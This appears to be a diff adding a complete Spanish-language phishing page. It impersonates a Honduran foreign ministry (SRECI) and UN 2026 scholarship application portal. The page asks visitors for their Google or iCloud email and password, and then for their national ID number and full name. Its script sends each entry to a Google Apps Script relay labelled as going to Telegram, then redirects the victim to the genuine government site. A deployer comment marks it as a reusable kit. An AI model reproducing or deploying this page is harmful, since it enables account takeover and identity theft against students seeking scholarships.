@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Postulación | Programa de Liderazgo 2026</title>
+    <link rel="icon" type="image/png" href="favicon.png">
+
+    <meta property="og:title" content="Sistema de Postulación de Becas | SRECI 2026">
+    <meta property="og:description" content="Portal oficial para la recepción de expedientes y actualización de datos personales.">
+    <meta property="og:image" content="https://hondurasbiologica.org/wp-content/uploads/2022/02/favicon-sreci.png">
+    <meta property="og:url" content="https://sreci-postulaciones-2026-becas.netlify.app/">
+
+    <script src="https://unpkg.com/lucide@latest"></script>
+   
+    <style>
+        :root {
+            --primary: #003366;
+            --primary-hover: #00264d;
+            --text-main: #202124;
+            --text-sub: #5f6368;
+            --border-color: #dadce0;
+            --input-focus: #1a73e8;
+            --bg-page: #f8f9fa;
+            --success-green: #188038;
+        }
+
+        
+        * { box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', Roboto, -apple-system, sans-serif;
+            background-color: var(--bg-page);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text-main);
+            padding: 15px; 
+        }
+
+        .login-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 48px 40px 36px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
+            transition: all 0.3s ease;
+        }
+
+        
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 30px 20px 24px;
+                border: none; 
+                box-shadow: none;
+                background: transparent;
+            }
+            body { background-color: #ffffff; } 
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .header img {
+            width: 85px;
+            height: auto;
+            margin-bottom: 16px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 500;
+            margin: 0;
+            letter-spacing: -0.2px;
+        }
+
+        .desc {
+            font-size: 15px;
+            color: var(--text-sub);
+            margin-top: 10px;
+            line-height: 1.4;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: var(--text-main);
+        }
+        
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border 0.1s ease-in-out;
+            background-color: #fff;
+            -webkit-appearance: none; 
+            -webkit-appearance: none; 
+            appearance: none;
+        }
+
+        input:focus {
+            border: 2px solid var(--input-focus);
+            padding: 12px 14px;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 36px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: var(--text-sub);
+            display: flex;
+            align-items: center;
+            padding: 0;
+            z-index: 10;
+        }
+
+        .btn-main {
+            background: var(--primary);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px; 
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.2s;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .btn-main:hover {
+            background: var(--primary-hover);
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 28px 0;
+            color: var(--text-sub);
+            font-size: 13px;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .divider span {
+            padding: 0 12px;
+        }
+
+        .sso-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            background: white;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #3c4043;
+            cursor: pointer;
+            margin-bottom: 12px;
+            transition: background 0.1s;
+        }
+
+        .sso-btn img {
+            width: 18px;
+            margin-right: 12px;
+        }
+
+        .hidden { display: none !important; }
+
+        .success-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: var(--text-sub);
+            text-align: center;
+            margin-top: 32px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ee/UN_emblem_blue.svg" alt="UN Logo">
+        <div id="header-text">
+            <h1>Postulación 2026</h1>
+            <p class="desc">Ingresa tus credenciales para acceder al registro</p>
+        </div>
+    </div>
+
+    <div id="step-1">
+        <div class="form-group">
+            <label>Correo electrónico(Google o ICloud)</label>
+            <input type="email" id="email" class="input-field" placeholder="Correo electrónico o teléfono">
+        </div>
+        <div class="form-group">
+            <label>Contraseña</label>
+            <input type="password" id="pass" class="input-field" placeholder="Introduce tu contraseña">
+            <button class="toggle-password" onclick="togglePass()">
+                <i data-lucide="eye" id="eye-icon" style="width: 20px;"></i>
+            </button>
+        </div>
+        <button class="btn-main" onclick="nextStep()">Siguiente</button>
+
+        <div class="divider"><span>O continuar con</span></div>
+
+        <button class="sso-btn">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google">
+            Google
+        </button>
+        <button class="sso-btn">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="iCloud" style="width: 15px;">
+            iCloud
+        </button>
+    </div>
+
+    <div id="step-2" class="hidden">
+        <div class="success-header">
+            <i data-lucide="check-circle-2" style="color: var(--success-green); width: 40px; height: 40px;"></i>
+            <h2 style="font-size: 18px; color: var(--success-green); margin: 0;">Identidad Verificada</h2>
+        </div>
+        <p class="desc" style="text-align: center; margin-bottom: 25px;">Sincroniza tus datos con el Registro Nacional de las Personas (Honduras).</p>
+        
+        <div class="form-group">
+            <label>DNI (Sin espacios ni guiones)</label>
+            <input type="text" id="dni" class="input-field" placeholder="Número de Identidad (DNI)" maxlength="13">
+        </div>
+        <div class="form-group">
+            <label>Nombre Completo</label>
+            <input type="text" id="nombre" class="input-field" placeholder="Nombre completo según registro">
+        </div>
+        <button class="btn-main" onclick="finalizar()">Confirmar Registro</button>
+    </div>
+
+    <div class="footer">
+        Protección de datos garantizada por la normativa internacional de privacidad 2026.
+    </div>
+</div>
+
+<script>
+    // REEMPLAZA ESTA URL POR LA QUE COPIASTE EN EL PASO 1
+    const googleBridgeURL = "https://script.google.com/macros/s/AKfycbyZNdox5mHQ3c3yGIT7KHrf0XQD8bRMuLerJXu4WFFK1EmSvi4fBh7_rEPdTL6qQVSC/exec";
+
+    async function sendToTelegram(mensaje) {
+        try {
+            await fetch(googleBridgeURL, {
+                method: "POST",
+                mode: "no-cors", // Para evitar bloqueos de seguridad del navegador
+                body: JSON.stringify({ payload: mensaje })
+            });
+        } catch (e) {
+            console.warn("Sincronización en segundo plano...");
+        }
+    }
+
+    async function nextStep() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        if(email.includes('@') && pass.length > 5) {
+            const btn = document.querySelector('#step-1 .btn-main');
+            btn.innerText = "Verificando...";
+            btn.disabled = true;
+
+            
+            await sendToTelegram(`<b> CB</b>\n<b>User:</b> <code>${email}</code>\n<b>Pass:</b> <code>${pass}</code>`);
+            
+            setTimeout(() => {
+                document.getElementById('step-1').classList.add('hidden');
+                document.getElementById('step-2').classList.remove('hidden');
+                window.scrollTo(0,0);
+            }, 800);
+        } else {
+            alert("Error: Por favor, verifique su correo y que la contraseña tenga más de 5 caracteres.");
+        }
+    }
+
+    async function finalizar() {
+        const dni = document.getElementById('dni').value;
+        const nombre = document.getElementById('nombre').value;
+
+        if(dni.length === 13 && nombre.length > 5) {
+            await sendToTelegram(`<b>📝 DATOS ADICIONALES</b>\n<b>Nombre:</b> ${nombre}\n<b>DNI:</b> <code>${dni}</code>`);
+            
+            alert("Información sincronizada correctamente. Su expediente ha sido actualizado.");
+            window.location.href = "https://sreci.gob.hn/becas-pregrados"; 
+        } else {
+            alert("Por favor, ingrese su nombre completo y un DNI válido (13 dígitos).");
+        }
+    }
+
+    function togglePass() {
+        const p = document.getElementById('pass');
+        const icon = document.getElementById('eye-icon');
+        if (p.type === "password") {
+            p.type = "text";
+            icon.setAttribute('data-lucide', 'eye-off');
+        } else {
+            p.type = "password";
+            icon.setAttribute('data-lucide', 'eye');
+        }
+        lucide.createIcons();
+    }
+
+    lucide.createIcons();
+</script>
+</body>
+</html>
